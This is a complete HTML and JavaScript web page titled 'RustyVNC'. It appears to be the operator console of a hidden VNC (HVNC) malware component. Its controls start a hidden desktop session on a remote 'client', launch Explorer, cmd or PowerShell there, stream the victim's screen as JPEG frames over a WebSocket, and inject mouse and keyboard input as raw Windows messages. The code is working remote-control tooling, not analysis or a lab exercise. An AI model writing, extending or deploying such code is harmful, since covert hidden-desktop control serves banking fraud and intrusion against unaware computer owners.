<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>RustyVNC</title>
  <style>
    :root {
      color-scheme: dark;
      --bg: #282828;
      --bg-h: #1d2021;
      --bg-s: #32302f;
      --bg1: #3c3836;
      --bg2: #504945;
      --fg: #ebdbb2;
      --fg2: #d5c4a1;
      --fg4: #a89984;
      --red: #fb4934;
      --green: #b8bb26;
      --yellow: #fabd2f;
      --blue: #83a598;
      --aqua: #8ec07c;
      --orange: #fe8019;
      font-family: Iosevka, "Fira Code", "Cascadia Code", "JetBrains Mono", Consolas, monospace;
    }
    * { box-sizing: border-box; }
    body { margin: 0; background: var(--bg); color: var(--fg); }
    header {
      height: 52px;
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 0 18px;
      border-bottom: 1px solid var(--bg2);
      background: var(--bg-h);
    }
    strong { color: var(--yellow); }
    button, input { font: inherit; }
    button {
      display: inline-flex;
      align-items: center;
      gap: 7px;
      min-height: 34px;
      background: var(--bg1);
      color: var(--fg2);
      border: 0;
      border-radius: 3px;
      padding: 7px 10px;
      cursor: pointer;
    }
    button:hover { background: var(--bg2); color: var(--fg); }
    button.primary { color: var(--green); }
    button.danger { color: var(--red); }
    main { display: grid; grid-template-rows: auto 1fr auto; height: calc(100vh - 53px); }
    .bar {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 12px 18px;
      border-bottom: 1px solid var(--bg1);
      background: var(--bg);
    }
    .status { margin-left: auto; color: var(--fg4); font-size: 12px; }
    .stage { display: flex; align-items: center; justify-content: center; overflow: hidden; background: var(--bg-h); }
    canvas { max-width: 100%; max-height: 100%; outline: none; cursor: crosshair; background: #000; }
    .pill {
      background: var(--bg1);
      color: var(--fg4);
      border-radius: 3px;
      padding: 4px 9px;
      font-size: 12px;
    }
    .ok { color: var(--green); background: rgba(184, 187, 38, .12); }
    .icon { width: 15px; height: 15px; stroke: currentColor; stroke-width: 2; fill: none; stroke-linecap: round; stroke-linejoin: round; flex: 0 0 auto; }
    .quality { display: inline-flex; align-items: center; gap: 8px; color: var(--fg2); }
    input[type="range"] { accent-color: var(--yellow); }
    .activity {
      min-height: 38px;
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 8px 18px;
      background: var(--bg);
      color: var(--fg4);
      font-size: 12px;
      overflow: hidden;
      white-space: nowrap;
      box-shadow: 0 -1px 0 var(--bg1);
    }
    .activity strong { color: var(--orange); font-weight: 600; }
    .activity-log { display: flex; align-items: center; gap: 12px; min-width: 0; overflow: hidden; }
    .event { color: var(--fg4); }
    .event b { color: var(--aqua); font-weight: 500; }
  </style>
</head>
<body>
  <header>
    <strong>RustyVNC</strong>
    <span id="client" class="pill">no client</span>
    <span id="active" class="pill">inactive</span>
  </header>
  <main>
    <section class="bar">
      <button id="start" class="primary" title="Start HVNC">
        <svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><polygon points="6 3 20 12 6 21 6 3"></polygon></svg>
        <span>Start</span>
      </button>
      <button id="stop" class="danger" title="Stop HVNC">
        <svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><rect x="6" y="6" width="12" height="12" rx="1"></rect></svg>
        <span>Stop</span>
      </button>
      <button data-launch="explorer" title="Launch Explorer">
        <svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M3 7h5l2 2h11v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><path d="M3 7V5a2 2 0 0 1 2-2h4l2 2h4"></path></svg>
        <span>Explorer</span>
      </button>
      <button data-launch="cmd" title="Launch cmd">
        <svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
        <span>CMD</span>
      </button>
      <button data-launch="powershell" title="Launch PowerShell">
        <svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><polyline points="4 17 10 11 4 5"></polyline><path d="M12 17h8"></path><path d="M3 3h18v18H3z"></path></svg>
        <span>PowerShell</span>
      </button>
      <label class="quality">Quality <input id="quality" type="range" min="10" max="95" step="5" value="70"></label>
      <span id="qualityText">70</span>
      <span id="status" class="status">connecting...</span>
    </section>
    <section class="stage">
      <canvas id="view" tabindex="0"></canvas>
    </section>
    <section class="activity">
      <strong>activity</strong>
      <div id="activityLog" class="activity-log">
        <span class="event">viewer loaded</span>
      </div>
    </section>
  </main>
  <script>
    const canvas = document.getElementById('view');
    const ctx = canvas.getContext('2d');
    const statusEl = document.getElementById('status');
    const clientEl = document.getElementById('client');
    const activeEl = document.getElementById('active');
    const quality = document.getElementById('quality');
    const qualityText = document.getElementById('qualityText');
    const activityLog = document.getElementById('activityLog');
    let ws;
    let remoteW = 0;
    let remoteH = 0;
    let lastStatus = '';

    const vk = {
      Backspace: 0x08, Tab: 0x09, Enter: 0x0D, Escape: 0x1B, ' ': 0x20,
      End: 0x23, Home: 0x24, ArrowLeft: 0x25, ArrowUp: 0x26, ArrowRight: 0x27, ArrowDown: 0x28,
      Insert: 0x2D, Delete: 0x2E, PageUp: 0x21, PageDown: 0x22,
      Shift: 0x10, Control: 0x11, Alt: 0x12
    };

    function connect() {
      ws = new WebSocket(`wss://${location.host}/ws/viewer${location.search}`);
      ws.binaryType = 'arraybuffer';
      ws.onopen = () => {
        logEvent('wss', 'viewer connected');
        send({ type: 'status' }, false);
      };
      ws.onclose = () => {
        statusEl.textContent = 'disconnected; retrying...';
        logEvent('wss', 'viewer disconnected');
        setTimeout(connect, 1000);
      };
      ws.onmessage = event => {
        if (event.data instanceof ArrayBuffer) drawFrame(event.data);
        else updateStatus(JSON.parse(event.data));
      };
    }

    function send(obj, record = true) {
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify(obj));
        if (record) logEvent('sent', eventLabel(obj));
      }
    }

    function updateStatus(s) {
      clientEl.textContent = s.connected ? shortId(s.client_id) : 'no client';
      clientEl.className = s.connected ? 'pill ok' : 'pill';
      activeEl.textContent = s.active ? 'active' : 'inactive';
      activeEl.className = s.active ? 'pill ok' : 'pill';
      const dims = s.width && s.height ? ` ${s.width}x${s.height}` : '';
      statusEl.textContent = `${s.message || 'ready'}${dims} frame=${s.frame_seq || 0}`;
      const status = `${s.connected ? 'client' : 'no client'} / ${s.active ? 'active' : 'inactive'} / frame=${s.frame_seq || 0}`;
      if (status !== lastStatus) {
        lastStatus = status;
        logEvent('status', status);
      }
    }

    function drawFrame(buf) {
      if (buf.byteLength < 24) return;
      const view = new DataView(buf);
      remoteW = view.getUint32(16, true);
      remoteH = view.getUint32(20, true);
      const jpeg = buf.slice(24);
      createImageBitmap(new Blob([jpeg], { type: 'image/jpeg' })).then(bitmap => {
        canvas.width = bitmap.width;
        canvas.height = bitmap.height;
        ctx.drawImage(bitmap, 0, 0);
        bitmap.close();
        logEvent('frame', `${remoteW}x${remoteH}`);
      });
    }

    function shortId(id) {
      return id ? id.slice(0, 8) : 'no client';
    }

    function coords(event) {
      const rect = canvas.getBoundingClientRect();
      const x = Math.max(0, Math.min(remoteW || canvas.width, Math.round((event.clientX - rect.left) * (remoteW || canvas.width) / rect.width)));
      const y = Math.max(0, Math.min(remoteH || canvas.height, Math.round((event.clientY - rect.top) * (remoteH || canvas.height) / rect.height)));
      return (((y & 0xffff) << 16) | (x & 0xffff)) >>> 0;
    }

    function input(msg, wparam, lparam) {
      send({ type: 'input', msg, wparam, lparam }, false);
    }

    function eventLabel(obj) {
      if (obj.type === 'start') return `start quality=${obj.quality}`;
      if (obj.type === 'launch') return `launch ${obj.action}`;
      return obj.type;
    }

    function logEvent(kind, text) {
      const item = document.createElement('span');
      item.className = 'event';
      item.innerHTML = `<b>${kind}</b> ${text}`;
      activityLog.appendChild(item);
      while (activityLog.children.length > 6) activityLog.removeChild(activityLog.firstElementChild);
    }

    document.getElementById('start').onclick = () => send({ type: 'start', quality: Number(quality.value) });
    document.getElementById('stop').onclick = () => send({ type: 'stop' });
    quality.oninput = () => qualityText.textContent = quality.value;
    document.querySelectorAll('[data-launch]').forEach(btn => {
      btn.onclick = () => send({ type: 'launch', action: btn.dataset.launch });
    });

    canvas.addEventListener('mousemove', e => input(0x0200, 0, coords(e)));
    canvas.addEventListener('mousedown', e => {
      canvas.focus();
      input(e.button === 2 ? 0x0204 : e.button === 1 ? 0x0207 : 0x0201, 1, coords(e));
      logEvent('input', 'mouse down');
      e.preventDefault();
    });
    canvas.addEventListener('mouseup', e => {
      input(e.button === 2 ? 0x0205 : e.button === 1 ? 0x0208 : 0x0202, 0, coords(e));
      e.preventDefault();
    });
    canvas.addEventListener('contextmenu', e => e.preventDefault());
    canvas.addEventListener('wheel', e => {
      const delta = e.deltaY < 0 ? 120 : -120;
      input(0x020A, (delta & 0xffff) << 16, coords(e));
      e.preventDefault();
    });
    canvas.addEventListener('keydown', e => {
      const code = vk[e.key] || (e.key.length === 1 ? e.key.toUpperCase().charCodeAt(0) : 0);
      if (code) input(0x0100, code, 1);
      if (e.key.length === 1) input(0x0102, e.key.charCodeAt(0), 1);
      logEvent('input', `key ${e.key}`);
      e.preventDefault();
    });
    canvas.addEventListener('keyup', e => {
      const code = vk[e.key] || (e.key.length === 1 ? e.key.toUpperCase().charCodeAt(0) : 0);
      if (code) input(0x0101, code, ((1 << 31) | (1 << 30) | 1) >>> 0);
      e.preventDefault();
    });

    connect();
  </script>
</body>
</html>
